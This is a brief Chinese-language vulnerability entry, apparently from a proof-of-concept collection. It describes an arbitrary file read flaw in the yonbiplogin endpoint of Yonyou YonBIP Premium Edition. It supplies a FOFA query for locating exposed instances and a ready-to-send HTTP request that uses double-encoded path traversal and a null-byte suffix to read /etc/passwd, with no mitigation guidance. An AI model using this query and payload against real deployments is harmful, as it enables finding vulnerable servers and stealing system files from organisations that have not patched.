# 用友YonBIP高级版yonbiplogin存在任意文件读取漏洞
YonBIP用友商业创新平台，是用友在数字经济时代面向成长型、大型企业及巨型企业，融合了先进且高可用技术平台和公共与关键商业应用与服务，支撑和运行客户的商业创新（业务创新、管理变革），并且具有数字化、智能化、高弹性、安全可信、社会化、全球化、平台化、生态化等特征的综合型服务平台。用友YonBIP高级版yonbiplogin存在任意文件读取漏洞

## fofa
```javascript
title="YonBIP" || title="数字化工作台"
```

![](https://cdn.nlark.com/yuque/0/2023/png/1622799/1699617335151-ab45cdc1-ba2a-4518-8a9d-5aa6a95e7263.png)

## poc
```plain
GET /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1731492309168-0423a749-4e24-497f-81f0-6ca9908af8d6.png)

